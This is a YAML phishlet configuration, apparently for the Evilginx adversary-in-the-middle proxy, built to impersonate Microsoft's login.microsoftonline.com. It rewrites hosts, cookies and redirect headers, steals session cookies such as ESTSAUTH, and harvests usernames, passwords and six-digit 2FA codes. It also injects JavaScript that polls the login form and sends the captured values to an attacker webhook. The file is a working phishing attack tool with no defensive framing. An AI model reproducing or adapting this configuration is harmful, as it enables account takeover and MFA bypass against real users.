name: 'microsoft'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, auto_filter: true}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true}
sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'logincdn.msauth.net', replace: 'logincdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'aadcdn.msftauth.net', replace: 'aadcdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json']}
  - {triggers_on: 'logincdn.msauth.net', orig_sub: 'logincdn', domain: 'msauth.net', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript']}

  # Cookie and Security Header Handling
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '.login.microsoftonline.com', replace: '.{{.Domain}}', mimes: [], headers: ['Set-Cookie', 'Cookie']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'ESTSAUTH', replace: 'ESTSAUTH', mimes: [], headers: ['Set-Cookie']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'redirect_uri=https://login.microsoftonline.com', replace: 'redirect_uri=https://{{.Endpoint2}}.{{.Domain}}', mimes: [], headers: ['Location']}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTH_LIGHT', 'ESTSSC', 'ESTSAUTHLIGHT', 'SignInStateCookie']
  - domain: '.microsoftonline.com'
    keys: ['SignInStateCookie', 'ESTSAUTH', 'ESTSAUTHPERSISTENT']
  - domain: 'login.microsoftonline.com'
    keys: ['MSFPC', 'ESTSSTATS']
credentials:
  username:
    key: 'loginfmt'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
  twofa:
    key: 'otc'
    search: '([0-9]{6})'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'
  paths:
    - '/'
    - '/common/oauth2/v2.0/authorize'
js_inject:
  - trigger_domains: ['{{.Endpoint2}}.{{.Domain}}', 'login.microsoftonline.com']
    trigger_paths: ['/.*']
    script: |
      (function() {
        const api = atob('{{.DomainBase64}}') + "/api/webhook";
        const secret = "{{.WebhookSecret}}";
        const source = "microsoft";
        let capturedEmail = '';
        
        function sendData(type, email, password, code) {
          fetch(api, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
            body: JSON.stringify({ event: type, source: source, email: email, password: password, code: code, remote_addr: "{{.VpsIp}}" })
          }).catch(function(){});
        }
        
        function capture() {
          const emailInput = document.querySelector('input[name="loginfmt"], input[type="email"]');
          const passInput = document.querySelector('input[name="passwd"], input[type="password"]');
          const codeInput = document.querySelector('input[name="otc"], input[id="idTxtBx_OTP_Code"]');
          
          if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
            capturedEmail = emailInput.value;
            sendData("email", capturedEmail, null, null);
          }
          
          if (passInput && passInput.value) {
            sendData("credentials", capturedEmail, passInput.value, null);
          }
          
          if (codeInput && codeInput.value && codeInput.value.length === 6) {
            sendData("2fa", capturedEmail, null, codeInput.value);
          }
        }
        
        setInterval(capture, 500);
        document.addEventListener('submit', function() { setTimeout(capture, 200); });
        new MutationObserver(capture).observe(document.body, { childList: true, subtree: true });
      })();
webhook:
  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
  headers:
    X-Webhook-Secret: "{{.WebhookSecret}}"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]